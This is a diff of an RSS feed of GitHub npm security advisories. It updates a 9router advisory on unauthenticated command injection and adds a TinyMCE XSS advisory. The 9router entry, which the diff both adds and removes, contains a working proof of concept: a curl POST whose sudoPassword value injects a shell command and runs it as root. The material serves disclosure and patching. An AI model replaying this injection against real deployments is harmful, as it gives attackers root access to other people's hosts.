@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-07T16:16:14.303Z</updated>
+    <updated>2026-07-07T18:53:36.586Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,182 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[9router] 9router: Missing Authorization and OS Command Injection]]></title>
+        <id>https://github.com/advisories/GHSA-g6g7-pvmx-m74p</id>
+        <link href="https://github.com/advisories/GHSA-g6g7-pvmx-m74p"/>
+        <updated>2026-07-07T18:35:36.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="unauthenticated-rce-via-apitunneltailscale-install">Unauthenticated RCE via <code>/api/tunnel/tailscale-install</code></h1>
+<p><strong>Affected:</strong> <code>9router</code> (npm package) — current master (<code>v0.4.39</code>).</p>
+<h3 id="summary">Summary</h3>
+<p><code>POST /api/tunnel/tailscale-install</code> accepts a JSON body with a <code>sudoPassword</code> field and pipes it, followed by the body of <code>https://tailscale.com/install.sh</code>, into a child process spawned as <code>sudo -S sh</code>. The route is not present in the dashboard middleware matcher in <code>src/proxy.js</code>, so the request reaches the handler without invoking <code>dashboardGuard.proxy()</code>. In deployments where the Node process runs as root (Docker images derived from <code>node:*</code> without a <code>USER</code> directive, <code>npm i -g 9router</code> invoked as root, or <code>systemd</code> units without <code>User=</code>), the spawned <code>sh</code> runs as root and executes the attacker-supplied bytes.</p>
+<h3 id="details">Details</h3>
+<h4 id="1-middleware-matcher-srcproxyjs3-15">1. Middleware matcher (<code>src/proxy.js:3-15</code>)</h4>
+<pre><code class="language-js">export const config = {
+  matcher: [
+    "/",
+    "/dashboard/:path*",
+    "/api/shutdown",
+    "/api/settings/:path*",
+    "/api/keys",
+    "/api/keys/:path*",
+    "/api/providers/client",
+    "/api/provider-nodes/validate",
+    "/api/cli-tools/:path*",
+    "/api/mcp/:path*",
+  ],
+};
+</code></pre>
+<p>Next.js invokes the middleware only for paths matching this list. Routes that are not listed — including the entire <code>/api/tunnel/*</code> family — do not invoke <code>dashboardGuard.proxy()</code>. No cookie, JWT, CLI token, or <code>Host</code>-header check is applied to them.</p>
+<h4 id="2-route-handler-srcappapitunneltailscale-installroutejs18-67">2. Route handler (<code>src/app/api/tunnel/tailscale-install/route.js:18-67</code>)</h4>
+<pre><code class="language-js">export async function POST(request) {
+  const body = await request.json().catch(() =&gt; ({}));
+  ...
+  const sudoPassword =
+    body.sudoPassword || getCachedPassword() || await loadEncryptedPassword() || "";
+  ...
+  const result = await installTailscale(sudoPassword, shortId, (msg) =&gt; {
+    send("progress", { message: msg });
+  });
+  ...
+}
+</code></pre>
+<p><code>body.sudoPassword</code> comes from the request body and is passed to <code>installTailscale</code>, which dispatches to <code>installTailscaleLinux</code> on Linux.</p>
+<h4 id="3-linux-installation-routine-srclibtunneltailscalejs304-341">3. Linux installation routine (<code>src/lib/tunnel/tailscale.js:304-341</code>)</h4>
+<pre><code class="language-js">async function installTailscaleLinux(sudoPassword, log) {
+  log("Downloading install script...");
+  return new Promise((resolve, reject) =&gt; {
+    const curlChild = spawn("curl", ["-fsSL", "https://tailscale.com/install.sh"], { ... });
+    let scriptContent = "";
+    curlChild.stdout.on("data", (d) =&gt; { scriptContent += d.toString(); });
+    curlChild.on("exit", (code) =&gt; {
+      if (code !== 0) return reject(...);
+      log("Running install script...");
+      const child = spawn("sudo", ["-S", "sh"], { stdio: ["pipe", "pipe", "pipe"], windowsHide: true });
+      ...
+      child.stdin.write(`${sudoPassword}\n`);   //  ← from request body
+      child.stdin.write(scriptContent);
+      child.stdin.end();
+    });
+  });
+}
+</code></pre>
+<p>The byte stream sent to the stdin of the <code>sudo -S sh</code> child process is:</p>
+<pre><code>&lt;sudoPassword from request body&gt;\n
+&lt;https://tailscale.com/install.sh body&gt;
+</code></pre>
+<p>When the caller is already root, has <code>NOPASSWD</code> configured for the user, or has a recent sudo timestamp cache, <code>sudo -S sh</code> does not read stdin for a password — it <code>exec</code>s <code>sh</code> directly. The new <code>sh</code> process inherits the stdin pipe and reads it line by line:</p>
+<ol>
+<li>The <code>sudoPassword</code> value from the request — interpreted as the first shell command.</li>
+<li>The <code>install.sh</code> body — interpreted as subsequent shell input.</li>
+</ol>
+<p>Appending <code>; exit 0</code> to the <code>sudoPassword</code> value causes <code>sh</code> to exit before the legitimate <code>install.sh</code> body runs. The host executes only the request-supplied bytes, as the 9router process user.</p>
+<p>Both "Docker container running as root" and "<code>npm i -g 9router</code> on a host with <code>NOPASSWD</code> sudo" reach this path.</p>
+<h3 id="poc">PoC</h3>
+<p>The reproduction below is self-contained: build a representative target image (Node process running as root, with <code>sudo</code> and <code>curl</code> on <code>PATH</code>), start it, send one unauthenticated POST with <code>curl</code>, and read the file written by the payload.</p>
+<p><strong>Step 1 — build the target image</strong></p>
+<pre><code class="language-sh">docker build -t 9router-vuln-root - &lt;&lt;'EOF'
+FROM node:22-bookworm-slim
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+        sudo curl ca-certificates \
+    &amp;&amp; rm -rf /var/lib/apt/lists/*
+RUN npm install -g 9router@0.4.39
+EXPOSE 20128
+CMD ["9router"]
+EOF
+</code></pre>
+<p><strong>Step 2 — start the target</strong></p>
+<pre><code class="language-sh">docker run -d --rm --name target -p 127.0.0.1:20129:20128 \
+    9router-vuln-root 9router --log --skip-update
+until curl -fs -o /dev/null http://127.0.0.1:20129/api/health; do sleep 1; done
+</code></pre>
+<p><strong>Step 3 — exploit (one unauthenticated POST)</strong></p>
+<pre><code class="language-sh">curl -sN -X POST http://127.0.0.1:20129/api/tunnel/tailscale-install \
+     -H 'Content-Type: application/json' \
+     -d '{"sudoPassword":"id &gt; /tmp/pwned.txt; exit 0"}'
+</code></pre>
+<p><strong>Step 4 — verify</strong></p>
+<pre><code class="language-sh">docker exec target cat /tmp/pwned.txt
+# uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>The trailing <code>"Tailscale not installed"</code> line is a consequence of <code>; exit 0</code> terminating <code>sh</code> before the legitimate <code>install.sh</code> body executed; the <code>id &gt; /tmp/pwned.txt</code> write completed earlier in the same <code>sh</code> invocation. The POST carried no credentials, cookies, or prior state.</p>
+<h3 id="impact">Impact</h3>
+<p><strong>Type:</strong> Improper Access Control + OS Command Injection (CWE-862 + CWE-78).</p>
+<p><strong>Affected operators:</strong> 9router operators on Linux/macOS whose deployment matches one of the following configurations:</p>
+<table>
+<thead>
+<tr>
+<th>Configuration</th>
+<th>Example</th>
+<th>Outcome</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Node process runs as root</td>
+<td>Custom <code>Dockerfile</code> without <code>USER</code>, <code>systemd</code> unit without <code>User=</code>, <code>sudo npm i -g 9router &amp;&amp; sudo 9router</code></td>
+<td>Unauthenticated remote root RCE (primary case in this report)</td>
+</tr>
+<tr>
+<td>Node process runs as a normal user with <code>NOPASSWD</code> sudo</td>
+<td>Developer laptop, CI runner, or single-tenant VPS where the operator's user has <code>NOPASSWD: ALL</code></td>
+<td>Unauthenticated remote RCE as the operator's user; root reachable via <code>sudo</code> from the foothold</td>
+</tr>
+<tr>
+<td>Node process runs as a normal user without <code>NOPASSWD</code> and no stored password</td>
+<td>Hardened multi-user host</td>
+<td>The spawn runs but <code>sudo</code> rejects the supplied value. No RCE; the request still triggers an outbound fetch from <code>tailscale.com</code> and the SSE error stream reveals platform information</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-g6g7-pvmx-m74p">https://github.com/decolua/9router/security/advisories/GHSA-g6g7-pvmx-m74p</a></li>
+<li><a href="https://github.com/decolua/9router/releases?q=0.4.44&amp;expanded=true">https://github.com/decolua/9router/releases?q=0.4.44&amp;expanded=true</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6g7-pvmx-m74p">https://github.com/advisories/GHSA-g6g7-pvmx-m74p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6g7-pvmx-m74p</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-02T20:17:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability using through data-mce- prefixed src, href, style attributes]]></title>
+        <id>https://github.com/advisories/GHSA-q742-qvgc-gc2f</id>
+        <link href="https://github.com/advisories/GHSA-q742-qvgc-gc2f"/>
+        <updated>2026-07-07T17:10:03.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Stored XSS vulnerability via unsanitized data-mce-* attributes (data-mce-href, data-mce-src, data-mce-style). Allows attackers to inject malicious values that override safe attributes during serialization, bypassing validation.</p>
+<h3 id="patches">Patches</h3>
+<p>Patched by stripping unsafe data-mce-* attributes during parsing. Users should upgrade to the latest patched versions (5 LTS, 7.x, 8.x).</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No official workaround available.</p>
+<h3 id="fix">Fix</h3>
+<p>To avoid this vulnerability:</p>
+<p>Upgrade to TinyMCE 8.5.1 or higher.
+Upgrade to TinyMCE 7.9.3 or higher.
+Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial <a href="https://www.tiny.cloud/long-term-support/">long-term support</a> contract).</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>Tiny thanks <a href="https://github.com/mtrill47">Tadi Kadango</a> (<a href="https://tadiwakadango.com/">website</a>)  and <a href="https://github.com/he1d3n">Ivan Babenko</a> for their help identifying this vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f">https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47759">https://nvd.nist.gov/vuln/detail/CVE-2026-47759</a></li>
+<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview</a></li>
+<li><a href="https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview</a></li>
+<li><a href="https://github.com/advisories/GHSA-q742-qvgc-gc2f">https://github.com/advisories/GHSA-q742-qvgc-gc2f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q742-qvgc-gc2f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-05T20:27:50.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[9router] 9router: Login brute-force protection bypass via spoofed X-Forwarded-For header]]></title>
         <id>https://github.com/advisories/GHSA-7cfm-pqrj-xgq7</id>
@@ -882,146 +1058,6 @@ expect('injected step').toMatchFileSnapshot('/home/runner/.github/workflows/back
         <published>2026-07-02T20:19:20.000Z</published>
     </entry>
     <entry>
-        <title type="html"><![CDATA[[9router] 9router: Missing Authorization and OS Command Injection]]></title>
-        <id>https://github.com/advisories/GHSA-g6g7-pvmx-m74p</id>
-        <link href="https://github.com/advisories/GHSA-g6g7-pvmx-m74p"/>
-        <updated>2026-07-02T20:17:57.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="unauthenticated-rce-via-apitunneltailscale-install">Unauthenticated RCE via <code>/api/tunnel/tailscale-install</code></h1>
-<p><strong>Affected:</strong> <code>9router</code> (npm package) — current master (<code>v0.4.39</code>).</p>
-<h3 id="summary">Summary</h3>
-<p><code>POST /api/tunnel/tailscale-install</code> accepts a JSON body with a <code>sudoPassword</code> field and pipes it, followed by the body of <code>https://tailscale.com/install.sh</code>, into a child process spawned as <code>sudo -S sh</code>. The route is not present in the dashboard middleware matcher in <code>src/proxy.js</code>, so the request reaches the handler without invoking <code>dashboardGuard.proxy()</code>. In deployments where the Node process runs as root (Docker images derived from <code>node:*</code> without a <code>USER</code> directive, <code>npm i -g 9router</code> invoked as root, or <code>systemd</code> units without <code>User=</code>), the spawned <code>sh</code> runs as root and executes the attacker-supplied bytes.</p>
-<h3 id="details">Details</h3>
-<h4 id="1-middleware-matcher-srcproxyjs3-15">1. Middleware matcher (<code>src/proxy.js:3-15</code>)</h4>
-<pre><code class="language-js">export const config = {
-  matcher: [
-    "/",
-    "/dashboard/:path*",
-    "/api/shutdown",
-    "/api/settings/:path*",
-    "/api/keys",
-    "/api/keys/:path*",
-    "/api/providers/client",
-    "/api/provider-nodes/validate",
-    "/api/cli-tools/:path*",
-    "/api/mcp/:path*",
-  ],
-};
-</code></pre>
-<p>Next.js invokes the middleware only for paths matching this list. Routes that are not listed — including the entire <code>/api/tunnel/*</code> family — do not invoke <code>dashboardGuard.proxy()</code>. No cookie, JWT, CLI token, or <code>Host</code>-header check is applied to them.</p>
-<h4 id="2-route-handler-srcappapitunneltailscale-installroutejs18-67">2. Route handler (<code>src/app/api/tunnel/tailscale-install/route.js:18-67</code>)</h4>
-<pre><code class="language-js">export async function POST(request) {
-  const body = await request.json().catch(() =&gt; ({}));
-  ...
-  const sudoPassword =
-    body.sudoPassword || getCachedPassword() || await loadEncryptedPassword() || "";
-  ...
-  const result = await installTailscale(sudoPassword, shortId, (msg) =&gt; {
-    send("progress", { message: msg });
-  });
-  ...
-}
-</code></pre>
-<p><code>body.sudoPassword</code> comes from the request body and is passed to <code>installTailscale</code>, which dispatches to <code>installTailscaleLinux</code> on Linux.</p>
-<h4 id="3-linux-installation-routine-srclibtunneltailscalejs304-341">3. Linux installation routine (<code>src/lib/tunnel/tailscale.js:304-341</code>)</h4>
-<pre><code class="language-js">async function installTailscaleLinux(sudoPassword, log) {
-  log("Downloading install script...");
-  return new Promise((resolve, reject) =&gt; {
-    const curlChild = spawn("curl", ["-fsSL", "https://tailscale.com/install.sh"], { ... });
-    let scriptContent = "";
-    curlChild.stdout.on("data", (d) =&gt; { scriptContent += d.toString(); });
-    curlChild.on("exit", (code) =&gt; {
-      if (code !== 0) return reject(...);
-      log("Running install script...");
-      const child = spawn("sudo", ["-S", "sh"], { stdio: ["pipe", "pipe", "pipe"], windowsHide: true });
-      ...
-      child.stdin.write(`${sudoPassword}\n`);   //  ← from request body
-      child.stdin.write(scriptContent);
-      child.stdin.end();
-    });
-  });
-}
-</code></pre>
-<p>The byte stream sent to the stdin of the <code>sudo -S sh</code> child process is:</p>
-<pre><code>&lt;sudoPassword from request body&gt;\n
-&lt;https://tailscale.com/install.sh body&gt;
-</code></pre>
-<p>When the caller is already root, has <code>NOPASSWD</code> configured for the user, or has a recent sudo timestamp cache, <code>sudo -S sh</code> does not read stdin for a password — it <code>exec</code>s <code>sh</code> directly. The new <code>sh</code> process inherits the stdin pipe and reads it line by line:</p>
-<ol>
-<li>The <code>sudoPassword</code> value from the request — interpreted as the first shell command.</li>
-<li>The <code>install.sh</code> body — interpreted as subsequent shell input.</li>
-</ol>
-<p>Appending <code>; exit 0</code> to the <code>sudoPassword</code> value causes <code>sh</code> to exit before the legitimate <code>install.sh</code> body runs. The host executes only the request-supplied bytes, as the 9router process user.</p>
-<p>Both "Docker container running as root" and "<code>npm i -g 9router</code> on a host with <code>NOPASSWD</code> sudo" reach this path.</p>
-<h3 id="poc">PoC</h3>
-<p>The reproduction below is self-contained: build a representative target image (Node process running as root, with <code>sudo</code> and <code>curl</code> on <code>PATH</code>), start it, send one unauthenticated POST with <code>curl</code>, and read the file written by the payload.</p>
-<p><strong>Step 1 — build the target image</strong></p>
-<pre><code class="language-sh">docker build -t 9router-vuln-root - &lt;&lt;'EOF'
-FROM node:22-bookworm-slim
-RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
-        sudo curl ca-certificates \
-    &amp;&amp; rm -rf /var/lib/apt/lists/*
-RUN npm install -g 9router@0.4.39
-EXPOSE 20128
-CMD ["9router"]
-EOF
-</code></pre>
-<p><strong>Step 2 — start the target</strong></p>
-<pre><code class="language-sh">docker run -d --rm --name target -p 127.0.0.1:20129:20128 \
-    9router-vuln-root 9router --log --skip-update
-until curl -fs -o /dev/null http://127.0.0.1:20129/api/health; do sleep 1; done
-</code></pre>
-<p><strong>Step 3 — exploit (one unauthenticated POST)</strong></p>
-<pre><code class="language-sh">curl -sN -X POST http://127.0.0.1:20129/api/tunnel/tailscale-install \
-     -H 'Content-Type: application/json' \
-     -d '{"sudoPassword":"id &gt; /tmp/pwned.txt; exit 0"}'
-</code></pre>
-<p><strong>Step 4 — verify</strong></p>
-<pre><code class="language-sh">docker exec target cat /tmp/pwned.txt
-# uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<p>The trailing <code>"Tailscale not installed"</code> line is a consequence of <code>; exit 0</code> terminating <code>sh</code> before the legitimate <code>install.sh</code> body executed; the <code>id &gt; /tmp/pwned.txt</code> write completed earlier in the same <code>sh</code> invocation. The POST carried no credentials, cookies, or prior state.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Type:</strong> Improper Access Control + OS Command Injection (CWE-862 + CWE-78).</p>
-<p><strong>Affected operators:</strong> 9router operators on Linux/macOS whose deployment matches one of the following configurations:</p>
-<table>
-<thead>
-<tr>
-<th>Configuration</th>
-<th>Example</th>
-<th>Outcome</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Node process runs as root</td>
-<td>Custom <code>Dockerfile</code> without <code>USER</code>, <code>systemd</code> unit without <code>User=</code>, <code>sudo npm i -g 9router &amp;&amp; sudo 9router</code></td>
-<td>Unauthenticated remote root RCE (primary case in this report)</td>
-</tr>
-<tr>
-<td>Node process runs as a normal user with <code>NOPASSWD</code> sudo</td>
-<td>Developer laptop, CI runner, or single-tenant VPS where the operator's user has <code>NOPASSWD: ALL</code></td>
-<td>Unauthenticated remote RCE as the operator's user; root reachable via <code>sudo</code> from the foothold</td>
-</tr>
-<tr>
-<td>Node process runs as a normal user without <code>NOPASSWD</code> and no stored password</td>
-<td>Hardened multi-user host</td>
-<td>The spawn runs but <code>sudo</code> rejects the supplied value. No RCE; the request still triggers an outbound fetch from <code>tailscale.com</code> and the SSE error stream reveals platform information</td>
-</tr>
-</tbody></table>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-g6g7-pvmx-m74p">https://github.com/decolua/9router/security/advisories/GHSA-g6g7-pvmx-m74p</a></li>
-<li><a href="https://github.com/advisories/GHSA-g6g7-pvmx-m74p">https://github.com/advisories/GHSA-g6g7-pvmx-m74p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g6g7-pvmx-m74p</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-02T20:17:56.000Z</published>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[[@nuxt/ui] @nuxt/ui: UAuthForm / UForm SSR markup omits `method`, leaking credentials via GET if submitted before hydration]]></title>
         <id>https://github.com/advisories/GHSA-gj2h-2fpw-fhv9</id>
         <link href="https://github.com/advisories/GHSA-gj2h-2fpw-fhv9"/>
@@ -1366,29 +1402,5 @@ until curl -fs -o /dev/null http://127.0.0.1:20129/api/health; do sleep 1; done
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-02T19:20:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@conform-to/dom] @conform-to/dom parseSubmission vulnerable to CPU exhaustion when parsing many unique form fields]]></title>
-        <id>https://github.com/advisories/GHSA-525m-7f82-2mf7</id>
-        <link href="https://github.com/advisories/GHSA-525m-7f82-2mf7"/>
-        <updated>2026-07-02T19:18:41.000Z</updated>
-        <content type="html"><![CDATA[<p>A CPU exhaustion vulnerability exists in Conform's <a href="https://conform.guide/api/react/future/parseSubmission"><code>parseSubmission</code></a> future API when parsing <code>FormData</code> or <code>URLSearchParams</code> submissions with many unique field names. The parser previously looked up values by field name, which could require repeated scans of the submitted entries and cause excessive synchronous CPU work if an attacker supplies a crafted submission.</p>
-<blockquote>
-<p>[!NOTE]
-The patched version fixes this by iterating submitted entries directly instead of repeatedly looking up values by field name. Applications that accept untrusted form submissions should still enforce request parsing limits before passing data to Conform. For multipart requests, <a href="https://www.npmjs.com/package/@remix-run/form-data-parser">@remix-run/form-data-parser</a> provides <code>maxParts</code>, <code>maxTotalSize</code>, <code>maxFileSize</code>, <code>maxFiles</code>, and <code>maxHeaderSize</code> options.</p>
-</blockquote>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-525m-7f82-2mf7">https://github.com/edmundhung/conform/security/advisories/GHSA-525m-7f82-2mf7</a></li>
-<li><a href="https://github.com/advisories/GHSA-525m-7f82-2mf7">https://github.com/advisories/GHSA-525m-7f82-2mf7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-525m-7f82-2mf7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-02T19:18:41.000Z</published>
     </entry>
 </feed>
